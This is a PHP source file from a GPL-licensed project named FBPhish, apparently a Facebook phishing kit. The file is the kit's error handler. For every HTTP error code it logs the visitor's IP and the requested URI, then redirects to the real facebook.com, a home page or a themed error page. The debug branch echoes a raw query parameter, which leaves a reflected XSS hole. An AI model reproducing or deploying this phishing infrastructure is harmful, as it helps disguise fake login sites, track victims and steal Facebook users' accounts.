<?php
/*
FBPhish
Copyright (C) 2016  Jamie4224

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see http://www.gnu.org/licenses/.
*/



// Set apppath
$apppath = __DIR__;

// Require . . .
require_once("$apppath/includes/config.inc.php");
require_once("$apppath/includes/classes/fbphish.class.php");
require_once("$apppath/includes/classes/sql.class.php");
require_once("$apppath/includes/classes/logger.class.php");
require_once("$apppath/includes/functions/debug.func.php");
require_once("$apppath/includes/functions/getip.func.php");

$FBPhish = new FBPhish();
$sql = new sql();
$logger = new logger();

$FBPhish->init();
$FBPhish->themecheck();

// Log incoming uri's from errorDocuments
if($_GET['dir'] == "error"){
	switch($_GET['msg']){
		case '400':
			if($debug == "true"){
				echo "<h1>400 - Bad Request</h1>";
				echo "<h3>The server cannot process the request due to an client error.</h3>";
				$logger->uriLog("log/uri/debug", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
			}else{
				$logger->uriLog("log/uri", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
				switch($config_option__460){
				case "facebook":
					header("Location: https://facebook.com");
					break;
				case "home":
					header("Location: /index.php");
					break;
				case "show":
					$errorPage = $FBPhish->loadPage("error");
					echo $errorPage;
					break;
				default:
					header("Location: $config_option__360");
				}
			}
			break;
		case '401':
			if($debug == "true"){
				echo "<h1>401 - Authorization Required</h1>";
				echo "<h3>You need to authorize before entering folder/using file</h3>";
				$logger->uriLog("log/uri/debug", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
			}else{
				$logger->uriLog("log/uri", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
				switch($config_option__460){
				case "facebook":
					header("Location: https://facebook.com");
					break;
				case "home":
					header("Location: /index.php");
					break;
				case "show":
					$errorPage = $FBPhish->loadPage("error");
					echo $errorPage;
					break;
				default:
					header("Location: $config_option__360");
				}
			}
			break;
		case '403':
			if($debug == "true"){
				echo "<h1>403 - Forbidden</h1>";
				echo "<h3>You have no permissions to view that page</h3>";
				$logger->uriLog("log/uri/debug", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
			}else{
				$logger->uriLog("log/uri", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
				switch($config_option__460){
				case "facebook":
					header("Location: https://facebook.com");
					break;
				case "home":
					header("Location: /index.php");
					break;
				case "show":
					$errorPage = $FBPhish->loadPage("error");
					echo $errorPage;
					break;
				default:
					header("Location: $config_option__360");
				}
			}
			break;
		case '404':
			$containsBl = "false";
			$blacklisted = array("ajax", "intern", "osd");
			foreach($blacklisted as $bl){
				if(strpos($_SERVER['REQUEST_URI'], $bl) !== false) {
				    $containsBl = "true";
				}
			}
			echo $containsBl;
			if($debug == "true"){
				echo "<h1>404 - Not Found</h1>";
				echo "<h3>The resource you are looking for has been deleted, moved or never existed</h3>";
				$logger->uriLog("log/uri/debug", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
			}else{
				if($containsBl == "false"){
					$logger->uriLog("log/uri", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
				}
				switch($config_option__460){
				case "facebook":
					header("Location: https://facebook.com");
					break;
				case "home":
					header("Location: /index.php");
					break;
				case "show":
					$errorPage = $FBPhish->loadPage("error");
					echo $errorPage;
					break;
				default:
					header("Location: $config_option__360");
				}
			}
			break;
		case '405':
			if($debug == "true"){
				echo "<h1>405 - Method Not Allowed</h1>";
				echo "<h3>The requested method is not allowed</h3>";
				$logger->uriLog("log/uri/debug", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
			}else{
				$logger->uriLog("log/uri", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
				switch($config_option__460){
				case "facebook":
					header("Location: https://facebook.com");
					break;
				case "home":
					header("Location: /index.php");
					break;
				case "show":
					$errorPage = $FBPhish->loadPage("error");
					echo $errorPage;
					break;
				default:
					header("Location: $config_option__360");
				}
			}
			break;
		case '407':
			if($debug == "true"){
				echo "<h1>407 - Proxy Authentication Required</h1>";
				echo "<h3>The client must first authenticate with the proxy</h3>";
				$logger->uriLog("log/uri/debug", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
			}else{
				$logger->uriLog("log/uri", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
				switch($config_option__460){
				case "facebook":
					header("Location: https://facebook.com");
					break;
				case "home":
					header("Location: /index.php");
					break;
				case "show":
					$errorPage = $FBPhish->loadPage("error");
					echo $errorPage;
					break;
				default:
					header("Location: $config_option__360");
				}
			}
			break;
		case '408':
			if($debug == "true"){
				echo "<h1>408 - Request Time-Out</h1>";
				echo "<h3>The server timed out waiting for the request</h3>";
				$logger->uriLog("log/uri/debug", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
			}else{
				$logger->uriLog("log/uri", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
				switch($config_option__460){
				case "facebook":
					header("Location: https://facebook.com");
					break;
				case "home":
					header("Location: /index.php");
					break;
				case "show":
					$errorPage = $FBPhish->loadPage("error");
					echo $errorPage;
					break;
				default:
					header("Location: $config_option__360");
				}
			}
			break;
		case '409':
			if($debug == "true"){
				echo "<h1>409 - Conflict</h1>";
				echo "<h3>The request could not be processed cause of a conflict</h3>";
				$logger->uriLog("log/uri/debug", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
			}else{
				$logger->uriLog("log/uri", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
				switch($config_option__460){
				case "facebook":
					header("Location: https://facebook.com");
					break;
				case "home":
					header("Location: /index.php");
					break;
				case "show":
					$errorPage = $FBPhish->loadPage("error");
					echo $errorPage;
					break;
				default:
					header("Location: $config_option__360");
				}
			}
			break;
		case '410':
			if($debug == "true"){
				echo "<h1>410 - Gone</h1>";
				echo "<h3>The requested resource is no longer availiable</h3>";
				$logger->uriLog("log/uri/debug", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
			}else{
				$logger->uriLog("log/uri", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
				switch($config_option__460){
				case "facebook":
					header("Location: https://facebook.com");
					break;
				case "home":
					header("Location: /index.php");
					break;
				case "show":
					$errorPage = $FBPhish->loadPage("error");
					echo $errorPage;
					break;
				default:
					header("Location: $config_option__360");
				}
			}
			break;
		case '413':
			if($debug == "true"){
				echo "<h1>413 - Payload Too Large</h1>";
				echo "<h3>The request is larger than the server is able or willing to process</h3>";
				$logger->uriLog("log/uri/debug", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
			}else{
				$logger->uriLog("log/uri", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
				switch($config_option__460){
				case "facebook":
					header("Location: https://facebook.com");
					break;
				case "home":
					header("Location: /index.php");
					break;
				case "show":
					$errorPage = $FBPhish->loadPage("error");
					echo $errorPage;
					break;
				default:
					header("Location: $config_option__360");
				}
			}
			break;
		case '414':
			if($debug == "true"){
				echo "<h1>414 - URI Too Long</h1>";
				echo "<h3>The URI provided was too long for the server to process</h3>";
				$logger->uriLog("log/uri/debug", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
			}else{
				$logger->uriLog("log/uri", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
				switch($config_option__460){
				case "facebook":
					header("Location: https://facebook.com");
					break;
				case "home":
					header("Location: /index.php");
					break;
				case "show":
					$errorPage = $FBPhish->loadPage("error");
					echo $errorPage;
					break;
				default:
					header("Location: $config_option__360");
				}
			}
			break;
		case '500':
			if($debug == "true"){
				echo "<h1>500 - Internal Server Error</h1>";
				echo "<h3>The server encountered an error (See log for more details)</h3>";
				$logger->uriLog("log/uri/debug", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
			}else{
				$logger->uriLog("log/uri", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
				switch($config_option__460){
				case "facebook":
					header("Location: https://facebook.com");
					break;
				case "home":
					header("Location: /index.php");
					break;
				case "show":
					$errorPage = $FBPhish->loadPage("error");
					echo $errorPage;
					break;
				default:
					header("Location: $config_option__360");
				}
			}
			break;
		case '502':
			if($debug == "true"){
				echo "<h1>502 - Bad Gateway</h1>";
				echo "<h3>The server was acting as a gateway or proxy and received an invalid response from the upstream server</h3>";
				$logger->uriLog("log/uri/debug", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
			}else{
				$logger->uriLog("log/uri", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
				switch($config_option__460){
				case "facebook":
					header("Location: https://facebook.com");
					break;
				case "home":
					header("Location: /index.php");
					break;
				case "show":
					$errorPage = $FBPhish->loadPage("error");
					echo $errorPage;
					break;
				default:
					header("Location: $config_option__360");
				}
			}
			break;
		case '503':
			if($debug == "true"){
				echo "<h1>503 - Service Unavailable</h1>";
				echo "<h3>The server is currently unavailable</h3>";
				$logger->uriLog("log/uri/debug", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
			}else{
				$logger->uriLog("log/uri", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
				switch($config_option__460){
				case "facebook":
					header("Location: https://facebook.com");
					break;
				case "home":
					header("Location: /index.php");
					break;
				case "show":
					$errorPage = $FBPhish->loadPage("error");
					echo $errorPage;
					break;
				default:
					header("Location: $config_option__360");
				}
			}
			break;
		case '504':
			if($debug == "true"){
				echo "<h1>504 - Gateway Time-Out</h1>";
				echo "<h3>The server was acting as a gateway or proxy and did not receive a timely response from the upstream server</h3>";
				$logger->uriLog("log/uri/debug", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
			}else{
				$logger->uriLog("log/uri", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
				switch($config_option__460){
				case "facebook":
					header("Location: https://facebook.com");
					break;
				case "home":
					header("Location: /index.php");
					break;
				case "show":
					$errorPage = $FBPhish->loadPage("error");
					echo $errorPage;
					break;
				default:
					header("Location: $config_option__360");
				}
			}
			break;
		case '505':
			if($debug == "true"){
				echo "<h1>505 - HTTP Version Not Supported</h1>";
				echo "<h3>The server does not support the HTTP protocol version used in the request</h3>";
				$logger->uriLog("log/uri/debug", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
			}else{
				$logger->uriLog("log/uri", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
				switch($config_option__460){
				case "facebook":
					header("Location: https://facebook.com");
					break;
				case "home":
					header("Location: /index.php");
					break;
				case "show":
					$errorPage = $FBPhish->loadPage("error");
					echo $errorPage;
					break;
				default:
					header("Location: $config_option__360");
				}
			}
			break;
		case '508':
			if($debug == "true"){
				echo "<h1>508 - Loop Detected</h1>";
				echo "<h3>The server detected an infinite loop while processing the request</h3>";
				$logger->uriLog("log/uri/debug", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
			}else{
				$logger->uriLog("log/uri", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
				switch($config_option__460){
				case "facebook":
					header("Location: https://facebook.com");
					break;
				case "home":
					header("Location: /index.php");
					break;
				case "show":
					$errorPage = $FBPhish->loadPage("error");
					echo $errorPage;
					break;
				default:
					header("Location: $config_option__360");
				}
			}
			break;
		default:
			if($debug == "true"){
				$msg = $_GET['msg'];
				echo "<h1>$msg</h1>";
				echo "<h3>No further details</h3>";
				$logger->uriLog("log/uri/debug", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
			}else{
				$logger->uriLog("log/uri", $baseurl . $_SERVER['REQUEST_URI'], "/main.syst.php", $_GET['msg'], getIp(), getMetaIp());
				switch($config_option__460){
				case "facebook":
					header("Location: https://facebook.com");
					break;
				case "home":
					header("Location: /index.php");
					break;
				case "show":
					$errorPage = $FBPhish->loadPage("error");
					echo $errorPage;
					break;
				default:
					header("Location: $config_option__360");
				}
			}
	}
}